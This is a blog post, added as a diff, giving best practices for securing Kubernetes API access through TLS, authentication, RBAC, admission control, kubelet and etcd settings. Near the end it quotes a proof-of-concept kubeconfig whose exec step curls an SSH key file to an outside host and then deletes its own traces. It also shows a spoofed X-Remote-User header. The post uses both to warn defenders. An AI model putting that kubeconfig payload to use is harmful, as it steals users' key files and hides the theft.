@@ -1,0 +1,595 @@
+---
+title: Secure Access to Kubernetes API.
+articleTitle: Kubernetes API Access Security Hardening.
+description: Kubernetes is driven by an HTTP API server which allows complete configuration and control of Kubernetes runtime. Therefore, securing access to the API server is one of the most critical security controls to ensure resilient Kubernetes in production.
+date: "2021-08-05"
+author: Sakshyam Shah
+logo:
+  image: ./assets/components-of-kubernetes.svg
+  alt: xx
+tags:
+  - kubernetes
+  - security
+layout: blogArticle
+---
+
+import BlogImage from "components/BlogImage";
+import { EmailSubscribeViolet } from "components/EmailSubscribe";
+import Quote from "components/Quote";
+
+In a Kubernetes cluster, Control Plane controls Nodes, Nodes control Pods, Pods control containers, and containers control applications. But
+what controls the Control Plane?
+
+Kubernetes exposes APIs that let you configure the entire Kubernetes cluster management lifecycle. Thus, securing access to the Kubernetes
+API is one of the most security-sensitive aspects to consider when considering Kubernetes security. Even the recently published [Kubernetes
+hardening guide](https://media.defense.gov/2021/Aug/03/2002820425/-1/-1/1/CTR_KUBERNETES%20HARDENING%20GUIDANCE.PDF) by NSA also suggests to
+"Use strong authentication and authorization to limit user and administrator access as well as to limit the attack surface" as one of the
+essential security measures to consider while securing the Kubernetes cluster.
+
+This post primarily focuses on recipes and best practices concerning API access control hardening in the Kubernetes cluster. If you want to
+implement strong authentication and authorization in the Kubernetes cluster you manage, this post is for you. Even if you use managed
+Kubernetes services like AWS EKS or GCP Kubernetes engine, this guide should help you understand how access control works internally, which
+will help you plan better for overall Kubernetes security.
+
+## 1. Understanding Kubernetes security from an architecture perspective
+<BlogImage src="./assets/4c.png" />
+
+Before we approach Kubernetes API access control from a security standpoint, it is essential to understand how Kubernetes works internally.
+Kubernetes is not a single product, per se. Architecturally, it is a collection of programs that work in tandem. So, unlike many software or
+products where you only have to think about an attack surface in terms of one single unit, in Kubernetes, you need to factor in all the
+collection of tools and moving parts.
+
+<BlogImage src="./assets/components-of-kubernetes.svg" />
+_Image via https://kubernetes.io/docs/concepts/security/overview/_
+
+Further, if you refer to the image above, which shows the classic [4C's of Cloud Native
+security](https://kubernetes.io/docs/concepts/security/overview/) model, the Cloud Native security model is a four-layered approach to
+secure cloud computing resources (code, container, cluster, and cloud/co-location/datacenter), where Kubernetes itself stands as one of the
+layers (cluster). Security vulnerabilities and misconfigurations in each of these layers can pose a security threat to another layer. Thus,
+the security of Kubernetes also depends on the security of overall Cloud Native components.
+
+## 2. Securing access to Kubernetes Control Plane (API server)
+
+API access control in Kubernetes is a three-step process. First, the request is authenticated, then the request is checked for valid
+authorization, then request admission control is performed, and finally, access is granted. But before the authentication process starts,
+ensuring that network access control and TLS connection are appropriately configured should be the first priority.
+
+## 2.1 Kubernetes API network access best practices
+
+### Configure and use TLS everywhere
+
+Connections to API server, communication inside Control Plane, and communication between Control Plane and Kubelet should only be
+provisioned to reachable using TLS connection. Though the API server can be easily configured to use TLS by supplying
+`--tls-cert-file=[file]` and `--tls-private-key-file=[file]` flag to the <ins>kube-apiserver</ins>, given Kubernetes’ ability to scale up or
+scale down quickly as required, it is challenging to configure continuous TLS cert management inside the cluster. To address this problem,
+Kubernetes introduced the [TLS bootstrapping](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)
+feature, which allows automatic certificate signing and TLS configuration inside a Kubernetes cluster.
+
+Below are the TLS-related flags supported by <ins>kube-apiserver</ins> that Kubernetes administrators should be aware of:
+
+## 2.2 Kubernetes API user account management best practices
+
+Control plane (the core container orchestration layer) in Kubernetes exposes several APIs and interfaces to define, deploy, and manage the
+lifecycle of containers. The API is exposed as HTTP REST API and can be accessed by any HTTP compatible client libraries. Kubectl, a CLI
+tool, is the default and preferred way of accessing these APIs. But who accesses these APIs? Typically users, normal users, and service
+accounts (ServiceAccount).
+
+### Managing normal user accounts
+
+Administrators should consider provisioning and managing normal user accounts using corporate IAM solutions (AD, Okta, G Suite OneLogin,
+etc.). This way, the security of managing normal user accounts' lifecycle can be enforced in compliance with existing corporate IAM
+policies. It also helps risks associated with normal user accounts be completely isolated from Kubernetes.
+
+### Managing service accounts
+
+Since service accounts are tied to a specific namespace and are used to achieve specific Kubernetes management purposes, they should be
+carefully and promptly audited for security.
+
+You can check available service accounts as follows:
+
+```bash
+$ kubectl get serviceaccounts
+NAME         SECRETS      AGE
+default         1         89m
+```
+
+Detail of a service account object can be viewed as:
+
+```bash
+$ kubectl get serviceaccounts/default -o yaml
+  apiVersion: v1
+  kind: ServiceAccount
+  metadata:
+    creationTimestamp: "2021-07-21T15:16:33Z"
+    name: default
+    namespace: default
+    resourceVersion: "418"
+    uid: 702c6c93-f4de-4068-ab37-ce36e37277a8
+  secrets:
+  - name: default-token-zr9tk
+```
+
+To view secrets associated (in case you want to check secret created time to rotate old secret) with the service account, you can use get
+secret command as:
+
+```bash
+$ kubectl get secret default-token-zr9tk -o yaml
+apiVersion: v1
+data:
+  ca.crt: LS0tLS1CRUxxx==
+  namespace: ZGVmYXVsdA==
+  token: ZXlKaGJHY2lPaUxxx=
+kind: Secret
+metadata:
+  annotations:
+    kubernetes.io/service-account.name: testserviceaccount
+    kubernetes.io/service-account.uid: 3e98a9b7-a2f5-4ea6-9e02-3fbee11f2439
+  creationTimestamp: "2021-07-21T18:03:44Z"
+  name: testserviceaccount-token-mtkv7
+  namespace: default
+  resourceVersion: "7500"
+  uid: 2b1da08b-2ff7-40f5-9e90-5848ce0475ca
+type: kubernetes.io/service-account-token
+```
+
+<Quote>
+  **Tip** In case of emergency and if you want to block service account access
+  without removing the service account itself, you can invalidate account
+  credentials using <ins>delete secret</ins> command as: `$ kubectl delete
+  secret testserviceaccount-token-mtkv7`
+</Quote>
+
+Also, discourage using default service accounts in favor of a dedicated service account per single application. This practice allows
+implementing the least privilege policy as-is required per application. However, if two or more applications require similar sets of
+privileges, reusing an existing service account (as opposed to creating a new one) is recommended because too many accounts can also create
+enough complexity. We know that complexity is an evil twin of security!
+
+In Kubernetes, not all pods need Kubernetes API access. But since a default service account token is automatically mounted into a new pod if
+no specific service account is specified, it might create an unnecessary attack surface and thus can be disabled when creating a new pod as:
+
+```yaml
+apiVersion: v1
+kind: ServiceAccount
+automountServiceAccountToken: false
+```
+
+<Quote>
+  **Tip**: Configure `--service-account-key-file` flag to the{" "}
+  <ins>kube-apiserver</ins> and `--service-account-private-key-file` flag to{" "}
+  <ins>kube-controller-manager</ins> so that a dedicated x509 certificates or
+  key-pair is used to sign and verify ServiceAccount tokens. Otherwise,
+  Kubernetes signs and verifies the ServiceAccount tokens using TLS private key,
+  the same key used to configure API server TLS connection
+  (`--tls-private-key-file`). If the tokens are compromised, and you need to
+  rotate the tokens, you will also need to rotate primary TLS certs, which might
+  be a problem operationally.
+</Quote>
+
+## 2.3 Kubernetes API access authentication best practices
+
+### Use external authentication
+
+Use external authentication service when possible. For example, if your organization already manages user accounts using corporate IAM
+service, using it to authenticate users and connecting them to Kubernetes using methods such as OIDC ([see configuring OpenID Connect
+guide](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#openid-connect-tokens)) is one of the safest authentication
+configurations.
+
+### One authentication method per user
+
+Kubernetes short-circuits authentication evaluation. Meaning, if a user is authenticated using one of the enabled authentication methods,
+Kubernetes immediately stops further authentication and forwards the request as authenticated one. Since Kubernetes allows enabling multiple
+authenticators to be configured and enabled simultaneously, **make sure that a single user account is only tied to a single authentication
+method.**
+
+For example, in a scenario where a malicious user is configured to authenticate with either of two different methods and
+if this user finds a way to bypass the weak authentication method, this user can entirely bypass the stronger authentication method since
+the first module to successfully authenticate the request short-circuits evaluation. The Kubernetes API server does not guarantee the order
+authenticators run in.
+
+### Decommission unused auth methods and unused tokens
+
+Perform periodic review of unused auth methods and auth tokens and remove or disable them. Administrators often use certain tools to help
+ease setup with the Kubernetes cluster and later switch to other methods for managing clusters. It is important in this case that previously
+used auth methods and tokens are thoroughly reviewed and decommissioned if they're no longer being used.
+
+### Avoid static tokens
+
+Static tokens are loaded indefinitely until server status is online. So in case the token is compromised, and you need to rotate the token,
+a complete server restart is required to flush out the compromised tokens. Though it's easier to configure authentication with static
+tokens, it is better to avoid this authentication method. Make sure the <ins>kube-apiserver</ins> is not started with
+`--token-auth-file=STATIC_TOKEN_FILE` option.
+
+### Avoid authentication via authenticating proxy
+
+Authenticating Proxy tells the Kubernetes API server to identify users based on the username mentioned in the HTTP header, such as
+
+<ins>X-Remote-User: [username]</ins>. This authentication method is pretty
+scary, as clients have complete control over intercepting and mangling HTTP
+headers if you know how HTTP works internally.
+
+For example, the following incoming request specifies authenticated user “dev1”:
+
+```bash
+GET / HTTP/1.1
+X-Remote-User: dev1
+X-Remote-Group: devgroup1
+X-Remote-Extra-Scopes: profile
+```
+
+So what's stopping a malicious user from intercepting or customizing the request and forwarding as:
+
+```bash
+GET / HTTP/1.1
+X-Remote-User: administrator
+X-Remote-Group: devgroup1
+X-Remote-Extra-Scopes: profile
+```
+
+This method is susceptible to HTTP header spoofing and the only protection in place to avoid spoofing is trust based on mTLS, where the <ins>kube-apiserver</ins> trusts the client cert signed by a trusted CA.
+
+If you genuinely require using Authenticating Proxy (not recommended), ensure security concerns around certificates are fully considered.
+
+### Disable anonymous access
+
+By default, unauthenticated yet unrejected HTTP requests are treated as anonymous access and are identified as <ins>system:anonymous</ins> user belonging to <ins>system:unauthenticated</ins> group. Unless there is a good reason to allow anonymous access (which is enabled by default), disable it when starting the API server as `$ kube-apiserver --anonymous-auth=false`.
+
+## 2.4 Kubernetes API access authorization best practices
+
+Once the request is authenticated, Kubernetes checks if the authenticated request should be allowed or denied. The decision is based on available authorization mode (enabled when starting <ins>kube-apiserver</ins>), and depends on attributes including user, group, extra (custom key-value labels), API resource, API endpoint, API request verb (get, list, update, patch, etc.), HTTP request verb (get, put, post, delete), resource, subresource, namespace, and API group.
+
+### Use RBAC
+
+RBAC in Kubernetes superseded the previously available ABAC method and is the preferred way to authorize API access. To enable RBAC, start the API server as `$ kube-apiserver --authorization-mode=RBAC`. It is also important to remember that RBAC permissions in Kubernetes are additive in nature, i.e. **there are no “deny” rules**.
+
+Kubernetes has two types of roles- <ins>Role and ClusterRole</ins>, and these roles can be granted with a method known as <ins>RoleBinding and ClusterBinding</ins>. However, since ClusterRole is broad in scope (Kubernetes cluster-wide), encourage the use of Roles and RoleBindings instead of ClusterRoles and ClusterRoleBindings.
+
+Below are built-in default roles that you need to be aware of:
+
+- **Cluster-admin:** Cluster-admin is a “root” or “superuser” like role and allows to perform any action on any resource in a cluster. Thus, the highest level of caution should be exercised on granting this role to any users.
+  For a quick check to know who is granted the special “cluster-admin” role; in this example, it’s just the “masters” group:
+
+```bash
+$ kubectl describe clusterrolebinding cluster-admin
+Name:         cluster-admin
+Labels:       kubernetes.io/bootstrapping=rbac-defaults
+Annotations:  rbac.authorization.kubernetes.io/autoupdate: true
+Role:
+  Kind:  ClusterRole
+  Name:  cluster-admin
+Subjects:
+  Kind   Name            Namespace
+  ----   ----            ---------
+  Group  system:masters
+
+```
+
+- **Admin:** This role permits unlimited read/write access to resources confined within a namespace. It is similar to clutter-admin allowing
+  the ability to create roles and role bindings within the namespace. Exercise high caution when assigning this role.
+
+- **Edit:** This role allows read/write access confined within a namespace except for the ability to view or modify roles or role bindings.
+  However, this role allows accessing Secrets of a ServiceAccount which can be used to gain (escalate privilege) access to restricted API
+  actions which are not available normally.
+
+- **View:** The most restricted built-in role which allows read-only access to objects in a namespace. Access excludes viewing Secrets,
+  roles, or role bindings.
+
+### ServiceAccount role scoped to application-specific role
+
+Always grant a role to <ins>ServiceAccount</ins> that is required for an application-specific context. To promote least-privilege security
+practice, Kubernetes scopes RBAC permissions assigned to <ins>ServiceAccounts</ins> that only work inside <ins>kube-system</ins> namespace
+by default. To increase the scope of the permission, for example, below shows granting read-only permission within “devteam” namespace to
+“devteamsa” service account — you will need to create role binding to increase the scope of the permission.
+
+```bash
+$ kubectl create rolebinding dev-sa-view --clusterrole=view --serviceaccount=devteam:devteamsa --namespace=devteam
+```
+
+### Do not grant “escalate” and “bind” role
+
+Make sure not to grant <ins>escalate</ins> or <ins>bind</ins> verbs on the <ins>Role</ins> or <ins>ClusterRole</ins>. Kubernetes implements
+a good way to prevent privilege escalation via editing roles and role bindings. The feature prevents users from creating or updating roles
+that they themselves do not have access to. So if you grant <ins>escalate</ins> or <ins>bind</ins> role, you basically are circumventing the
+privilege escalation prevention feature and a malicious user can escalate their privilege.
+
+For reference, following <ins>ClusterRole</ins> and <ins>RoleBinding</ins> would allow <ins>non_priv_user</ins> to grant other users the
+
+<ins>admin, edit, view</ins> roles in the namespace non_priv_user_namespace:
+
+```yaml
+# Create ClusterRole
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: role-grantor
+rules:
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["rolebindings"]
+    verbs: ["create"]
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["clusterroles"]
+    verbs: ["bind"]
+    resourceNames: ["admin", "edit", "view"]
+```
+
+```yaml
+# Create RoleBinding
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: role-grantor-binding
+  namespace: non_priv_user_namespace
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: role-grantor
+subjects:
+  - apiGroup: rbac.authorization.k8s.io
+    kind: User
+    name: non_priv_user
+```
+
+### Check and disable insecure port
+
+Ensure you are not running the <ins>kube-apiserver</ins> with insecure port enabled as `--insecure-port` as Kubernetes allow API calls via
+insecure port (if enabled) without enforcing authentication or authorization.
+
+### Periodically check for authorization status
+
+Use `$ kubectl auth can-i` command to quickly check API authorization status.
+
+```bash
+$ kubectl auth can-i create deployments --namespace dev
+yes
+```
+
+The command returns either “yes” or “no” depending on the authorization role. Although you can use the command to check your own
+authorization status, this command is more useful to crosscheck permissions for other users by combining with user impersonation command as
+
+```bash
+$ kubectl auth can-i list secrets --namespace dev --as user_name_to_check
+```
+
+<Quote>
+  **Tip:** Try the following command and if the result is “yes” it means the
+  user is allowed to do anything!! `$ kubectl auth can-i '*' '*' --as
+  user_name_to_check`
+</Quote>
+
+### Do not use `--authorization-mode=AlwaysAllow`
+
+Ensure that you are not running the <ins>kube-apiserver</ins> with `--authorization-mode=AlwaysAllow` flag as it will tell the server not to
+require authorization for incoming API requests.
+
+### Discourage granting pod creation roles
+
+Be careful when granting pod creation role as users with the ability to create a Pod in a namespace can escalate their role within the
+namespace and can read all secrets, config maps, or impersonate any service accounts within that namespace.
+
+### Use Admission Controller
+
+Authentication checks for valid credentials, and authorization checks if a user is allowed to perform specific tasks. But how would you
+ensure that an authenticated and authorized user performs tasks correctly and securely? To solve this, Kubernetes supports the Admission
+Control feature, which allows to modify or validate requests (after successful authentication and authorization).
+
+There are many Admission Control modules shipped with Kubernetes. Controllers such as <ins>NodeRestriction</ins> allow to control access
+requests made by Kubelets; <ins>PodSecurityPolicy</ins>, which is triggered during the API events related to creating and modifying the Pod,
+can be used to enforce minimum security standards to Pod. In addition, controllers such as <ins>ValidatingAdmissionWebhooks</ins> and
+
+<ins>MutatingAdmissionWebhooks</ins> allow policy enforcement on the fly by initiating
+HTTP requests to external services (via Webhook) and performing actions based on
+the response. This decouples policy management and enforcement logic from core Kubernetes
+and helps you unify secure container orchestration across various Kubernetes clusters
+or deployments. Refer to this page on how you can define and run your [custom admission
+controller](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/)
+using these two controllers.
+
+- **Enable/Disable Specific Admission Controller**
+  Default availability of built-in admission controllers depends on how and where your Kubernetes cluster is bootstrapped (custom Kubernetes
+  distro, AWS EKS, GCP Kubernetes Engine, etc). You can check the currently enabled admission controller as:
+
+```bash
+$ kubectl -n kube-system describe po kube-apiserver-[name]
+Name: kube-apiserver-minikube
+...
+Containers:
+kube-apiserver:
+   kube-apiserver
+    ...
+   --enable-admission-plugins=NamespaceLifecycle,LimitRanger,ServiceAccount,
+      DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,
+      MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota
+   --enable-bootstrap-token-auth=true
+
+```
+
+If you want to enable or disable a specific admission controller, you can use commands as:
+
+```bash
+# Enable admission controller
+$ kube-apiserver --enable-admission-plugins=[comma separated list of admission controllers]
+
+# Disable admission controller
+$ kube-apiserver --disable-admission-plugins=[comma separated list of admission controllers]
+```
+
+- **Ensure availability and configure proper timeouts**
+  Kubernetes supports dynamic admission control by allowing admission webhook server integration. While dynamic controllers allow
+  implementing custom admission controllers easily, make sure the availability of the webhook service is checked because the external
+  requests can introduce latency which can affect the overall availability of the Kubernetes cluster.
+
+```yaml
+apiVersion: admissionregistration.k8s.io/v1
+kind: ValidatingWebhookConfiguration
+---
+webhooks:
+  - name: test-webhook.endpoint.com
+    timeoutSeconds: 2
+```
+
+## 3. Securing access to Kubernetes Kubelet
+
+As we discussed earlier in this post, Kubelets are the primary components that run the Kubernetes node. <ins>Kubelet</ins> takes a <ins>PodSpec</ins> and runs nodes based on that spec. Kubelet also exposes HTTP API, which can be used to control and configure Pods and Nodes.
+
+### Restrict direct network access to node and Kubelet API
+
+Similar to controlling direct network access to API servers, restricting direct network access to Kubelet and nodes is equally important. Use network firewalls, HTTP proxies, and configurations to restrict direct access to Kubelet API and Node.
+
+### Use NetworkPolicies
+
+[NetworkPolicies](https://kubernetes.io/docs/concepts/services-networking/network-policies/) can be used to isolate Pods and control traffic between Pod and Namespaces. They allow configuring network access on OSI 3 and 4 layers. A securely configured NetworkPolicies should protect from pivoting impact where one of the Node or Pod or a Namespace in a cluster is compromised.
+
+The following example policy shows a deny-all ingress traffic policy.
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-ingress
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+```
+
+Also, check this [network policy recipes collection](https://github.com/ahmetb/kubernetes-network-policy-recipes) that you can copy-paste!
+
+### Enable authentication to kubelet API
+
+- **Authentication with x509 certs**
+  To enable X509 client cert authentication between Kubelet and <ins>kube-apiserver</ins>, start Kubelet server with `--client-ca-file` flag
+  and start <ins>kube-apiserver</ins> with `--kubelet-client-certificate` and `--kubelet-client-key` flags.
+
+- **Authentication with API bearer tokens**
+  Kubelet supports API bearer token authentication by delegating authentication to an external server. To enable this feature, start Kubelet
+  with `--authentication-token-webhook` flag. Then, Kubelet will query the external Webhook server at TokenReview endpoint as
+  `https://WebhookServerURL/<TokenReview>` endpoint to validate the token.
+
+- **Disable anonymous access**
+  Similar to <ins>kube-apiserver</ins>, kubelet also allows anonymous access. To disable it, start kubelet as `$ kublet --anonymous-auth=false`.
+
+- **Enable authorization to kubelet API**
+  The default authorization mode for kubelet API is <ins>AlwaysAllow</ins> which authorizes every incoming request. Kubelet supports
+  authorization delegation to Webhook server (similar to kubelet authentication with bearer token) via webhook mode. To configure it, start
+  Kubelet with `--authorization-mode=Webhook` and the `--kubeconfig` flags. Once this is configured, Kubelet calls the
+    <ins>SubjectAccessReview</ins> endpoint on the <ins>kube-apiserver</ins> as `https://WebhookServerURL/<SubjectAccessReview>` to perform
+authorization checks.
+
+## 4. Extra security considerations for API access control
+
+### Secure access to Kubernetes dashboard
+
+Insecure access to the Kubernetes dashboard can be a fatal loophole in your overall Kubernetes security posture. Therefore, if you have installed and allow access to the Kubernetes dashboard, ensure that strong authentication and authorization (related to general web application security) controls are in place.
+
+### Use namespace to segregate sensitive workloads
+
+Namespaces in Kubernetes are a valuable feature to group related resources together in a virtual boundary. In terms of security, namespace combined with RoleBinding also helps contain the blast radius of a security impact. If you use namespaces to segregate sensitive workloads, compromise of account access in one namespace helps prevent security impact in one namespace pivoting into another namespace. Namespace segregation, along with <ins>NetworkPolicies</ins> is one of the best combinations to protect Nodes.
+
+### Only Use kubeconfig files from trusted sources
+
+Using a specially-crafted kubeconfig file could result in malicious code execution or sensitive file exposure. Therefore, when using kubeconfig file, inspect it carefully as you would inspect a shell script.
+
+Following is a sample Kubeconfig file which, when executed, leaks SSH private keys (taken from [Kubernetes GitHub Issue on using untrusted Kubeconfig files](https://github.com/kubernetes/kubectl/issues/697))
+
+```yaml
+# execute arbitrary commands with the exec authenticator
+# in the example, leak the ssh keys (.pub is optional) and remove the traces
+apiVersion: v1
+clusters:
+  - cluster:
+      server: https://eipu5nae.free.beeceptor.com/
+    name: poc
+contexts:
+  - context:
+      cluster: poc
+      user: poc
+    name: poc
+current-context: poc
+kind: Config
+preferences: {}
+users:
+  - name: poc
+    user:
+      exec:
+        apiVersion: client.authentication.k8s.io/v1alpha1
+        command: sh
+        args:
+          - -c
+          - 'curl -d@../.ssh/id_rsa.pub https://eipu5nae.free.beeceptor.com/exec; sed -i -e ''/exec:/,$ d'' "$KUBECONFIG" || true'
+```
+
+### Use feature gates to reduce attack surface
+
+Kubernetes supports feature gates (a set of key=value pairs) that can be used to enable and disable specific Kubernetes features. Since
+Kubernetes offers many features (that are configurable via API), some of them might not be applicable to your requirements and thus should
+be turned off to reduce the attack surface.
+
+Also, Kubernetes differentiates features as "Alpha (unstable, buggy), Beta (stable, enabled by default), and GA (General Availability
+features, enabled by default) stage. So if you want to disable Alpha features (except for GA features which cannot be disabled) by passing a
+flag to the <ins>kube-apiserver</ins> as `--feature-gates="...,LegacyNodeRoleBehavior=false, DynamicKubeletConfig=false"`
+
+### Use limit ranges and resource quotas to prevent denial of service attacks
+
+Both limit ranges (constraints that prevent resource usage at Pod and Container level) and resource quotas (constraints that reserve
+resource availability consumption in a namespace) ensure fair usage of available resources. Ensuring resource limits can also be a good
+precaution to misuse of computing resources, as in the case of crypto-mining attack campaigns.
+
+Refer to these pages to understand [limit ranges](https://kubernetes.io/docs/concepts/policy/limit-range/) and [resource
+quota](https://kubernetes.io/docs/concepts/policy/resource-quotas/) policies available in Kubernetes in detail.
+
+### Restrict direct access to etcd and encrypt etcd to prevent plain text access to configuration data
+
+Etcd is the default data store for all the cluster data, and access to etcd is the same as getting root permission in the Kubernetes
+cluster. Also, etcd offers its own sets of HTTP API, which means etcd access security should be concerned with both direct network access
+and HTTP requests. Refer to Kubernetes guide on [operating etcd
+cluster](https://kubernetes.io/docs/tasks/administer-cluster/configure-upgrade-etcd/#securing-etcd-clusters) and check [official etcd
+docs](https://etcd.io/docs/v3.5/) for more information on securing etcd. Also, use `--encryption-provider-config` flag to configure how API
+config data should be encrypted in etcd. Refer to guide [encrypting secret data at
+rest](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/) to understand the feature as offered by Kubernetes.
+
+For TLS communication between etcd and <ins>kube-apiserver</ins>, refer to the [section above](#kube-apiserver-etcd-tls).
+
+### Log and monitor API access events
+
+Use [monitoring, logging, and auditing features](https://kubernetes.io/docs/tasks/debug-application-cluster/) to capture and view all API
+events. Below is a sample audit config file that can be passed to the <ins>kube-apiserver</ins> as following command.
+
+```yaml
+apiVersion: audit.k8s.io/v1
+kind: Policy
+# Discard events related to requests in RequestReceived stage.
+omitStages:
+  - "RequestReceived"
+rules:
+  # Log pod changes at RequestResponse level
+  - level: RequestResponse
+    resources:
+      - group: ""
+        # Resource "pods" doesn't match requests to any subresource of pods,
+        # which is consistent with the RBAC policy.
+        resources: ["pods"]
+  # Log "pods/log", "pods/status" at Metadata level
+  - level: Metadata
+    resources:
+      - group: ""
+        resources: ["pods/log", "pods/status"]
+```
+
+```bash
+$ kube-apiserver -audit-policy-file=[filename]
+```
+
+Refer to [this guide](https://kubernetes.io/docs/tasks/debug-application-cluster/audit/) for more detail on audit configurations.
+
+<EmailSubscribeViolet />
+
+## Conclusion
+
+Kubernetes supports highly flexible access control schemes but choosing the best and secure way to manage API access is one of the most
+security-sensitive aspects to consider while thinking about Kubernetes security. In this article, we showed various API access control
+schemes supported by Kubernetes along with best practices to use them.
+
+We focused this article on topics related to Kubernetes API access control. Whether you need to manage Kubernetes clusters or use a managed
+Kubernetes service (AWS EKS, GCP Kubernetes engine), knowing access control features supported by Kubernetes as described in this post
+should help you understand and apply security modals to the Kubernetes cluster. Also, do not forget the 4C's of Cloud Native security. Each
+layer of the Cloud Native security model builds upon the next outermost layer, so Kubernetes security depends on overall Cloud Native
+security.
